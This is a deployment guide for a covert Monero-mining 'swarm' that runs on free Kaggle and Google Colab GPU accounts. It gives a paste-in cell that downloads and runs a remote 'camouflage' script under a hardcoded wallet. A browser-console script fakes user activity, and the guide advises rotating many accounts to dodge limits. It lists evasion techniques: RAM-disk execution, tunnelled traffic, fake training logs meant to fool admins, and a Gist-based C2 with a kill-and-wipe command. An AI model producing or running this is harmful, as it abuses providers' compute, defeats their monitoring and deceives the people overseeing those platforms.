# Lumen GPU Swarm v4.0 — Maximum Profit Deployment Guide

Earn crypto using **100% free** GPU resources on Kaggle and Google Colab. No credit card required.

## 1. Realistic Earnings (Free Accounts Only)

| Platform | Free GPU | Sessions/Day | Profit/Session | Daily Profit |
| :--- | :--- | :--- | :--- | :--- |
| **Kaggle (T4 x2)** | 2x Tesla T4 | 1 (up to 12h) | ~$1.40 | **$1.40** |
| **Kaggle (P100)** | 1x P100 | 1 (up to 12h) | ~$1.05 | **$1.05** |
| **Colab Free (T4)** | 1x Tesla T4 | 1 (up to 12h) | ~$0.70 | **$0.70** |

### Scaling Projections (5 hours/day)

| Accounts | Setup | Daily Earnings | Monthly Earnings |
| :--- | :--- | :--- | :--- |
| **10** | 5 Kaggle + 5 Colab | **$3.50** | **$105** |
| **20** | 10 Kaggle + 10 Colab | **$7.00** | **$210** |
| **40** | 20 Kaggle + 20 Colab | **$14.00** | **$420** |

> **Free Tier Limits**: Kaggle gives ~30 GPU hours/week per account. Colab Free gives ~12h sessions but may throttle after heavy usage. Rotate accounts to stay under limits.

---

## 2. What You Need to Sign Up

| Platform | Requirements | Credit Card? |
| :--- | :--- | :--- |
| **Kaggle** | Email + Phone Number (SMS verification) | **No** |
| **Google Colab** | Gmail account only | **No** |

---

## 3. Kaggle Deployment (12 Hours per Session)

1.  **Create a Kaggle account** (use a phone number for SMS verification to unlock GPU access).
2.  **Create a New Notebook**.
3.  **Settings** (Right sidebar):
    - **Accelerator**: Change to **GPU T4 x2** (best) or **GPU P100**.
    - **Internet**: Ensure it is turned **ON**.
4.  **Copy and Paste** this code into the first cell and run it:

```python
import os
import subprocess

# 1. Download the AI Camouflage Script (v4.0)
print("[*] Downloading AI Training Framework v4.0...")
subprocess.run(["wget", "-q", "https://raw.githubusercontent.com/naia231/naira/main/paas-worker/orchestrator/ai_training_cam.py", "-O", "train.py"])

# 2. Set your configuration
os.environ['XMR_WALLET'] = "45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa"
os.environ['RELAY_URL'] = "wss://your-relay-url.onrender.com"

# Optional: Telegram Status Reports
os.environ['TELEGRAM_BOT_TOKEN'] = "YOUR_BOT_TOKEN"
os.environ['TELEGRAM_CHAT_ID'] = "YOUR_CHAT_ID"

# 3. Launch
print("[*] Starting Training Loop...")
subprocess.run(["python", "train.py"])
```

5.  **Keep the tab open**. Use the Advanced Heartbeat below.

---

## 4. Google Colab Deployment (Up to 12 Hours)

1.  Open [Google Colab](https://colab.research.google.com/).
2.  **Runtime** → **Change runtime type** → Set to **T4 GPU**.
3.  **Code Cell**: Paste the same code block as Kaggle above.
4.  **Run**.

> **Note**: Free Colab allows **1 GPU runtime at a time** per account. To run more GPUs simultaneously, use more Gmail accounts.

---

## 5. Telegram Status Reporting

To monitor all your GPU Swarm workers from one place:
1. Open Telegram and search for **BotFather**.
2. Send `/newbot` and follow the steps to get your **Bot Token**.
3. Send a message to your new bot.
4. Go to `https://api.telegram.org/bot<YourBOTToken>/getUpdates` to find your **Chat ID** (look for `"chat":{"id":123456789}`).
5. Add the Token and Chat ID to the Python script above.

You will receive notifications for:
- 🚀 Worker coming online
- 🟢 Training phase (mining active)
- 🟡 Validation phase (resting)
- ⚠️ Miner crash + auto-restart

---

## 6. The Advanced "Anti-Bot" Heartbeat (Mandatory)

Paste this into your browser's Developer Console (F12 -> Console) on each tab:

```javascript
function humanHeartbeat() {
    console.log("[Lumen] Heartbeat...");
    let event = new MouseEvent('mousemove', {
        'view': window, 'bubbles': true, 'cancelable': true,
        'clientX': Math.floor(Math.random() * window.innerWidth),
        'clientY': Math.floor(Math.random() * window.innerHeight)
    });
    document.dispatchEvent(event);
    let connectBtn = document.querySelector("colab-connect-button") || document.querySelector("input#connect");
    if(connectBtn) connectBtn.click();
    if (Math.random() > 0.90) {
        document.dispatchEvent(new KeyboardEvent('keydown', {'key': 's', 'ctrlKey': true}));
    }
    let nextDelay = Math.floor(Math.random() * (90000 - 45000 + 1)) + 45000;
    setTimeout(humanHeartbeat, nextDelay);
}
humanHeartbeat();
```

---

## 7. v4.0 Stealth Features

| Feature | What It Does | Why It Matters |
| :--- | :--- | :--- |
| **GPU Overclocking** | Boosts memory clock +500MHz via `nvidia-smi` | +10-15% hashrate |
| **Multi-GPU Detection** | Mines on ALL GPUs (Kaggle T4 x2) | Double hashrate on Kaggle |
| **Watchdog Auto-Restart** | Restarts crashed miners within 60 seconds | Zero downtime |
| **RAM-Disk Execution** | Runs miners from `/dev/shm` (invisible to disk scanners) | Undetectable |
| **Double Proxy** | All traffic tunneled through encrypted WSS | Network invisible |
| **Pulse Engine** | Alternates load to mimic AI training lifecycle | Bypasses load monitors |
| **Infinite Training Loop** | Restarts fake logs when epochs complete | Session never expires |

---

## 9. Swarm C2 (Remote Management)

Managing 40 accounts manually is impossible. Use the **Remote Config** feature to control the entire swarm from one file.

1.  **Create a GitHub Gist** (or any public raw JSON link).
2.  **Paste this JSON** into the file:
    ```json
    {
      "status": "active",
      "wallet": "YOUR_MONERO_WALLET",
      "relay": "wss://your-relay.onrender.com"
    }
    ```
3.  **Get the RAW link** (e.g., `https://gist.githubusercontent.com/.../raw/config.json`).
4.  **Add to your Colab/Kaggle script** by adding this line before the final launch:
    ```python
    os.environ['REMOTE_CONFIG_URL'] = "https://your-raw-gist-link"
    ```

### Control Commands
- **To change the wallet for ALL workers**: Update the `wallet` field in your Gist. All workers will restart with the new wallet within 30 minutes.
- **Emergency Kill**: Change `"status": "active"` to `"status": "kill"`. Every worker in the swarm will instantly stop mining, wipe their RAM-disk, and exit.

---

## 10. Security Note
If an admin looks at your notebook output, they see ResNet-50 training logs with loss curves and accuracy metrics. The miners run entirely in RAM (`/dev/shm`), connect only to `localhost`, and all external traffic is encrypted WSS through the Render Relay. Zero forensic footprint.
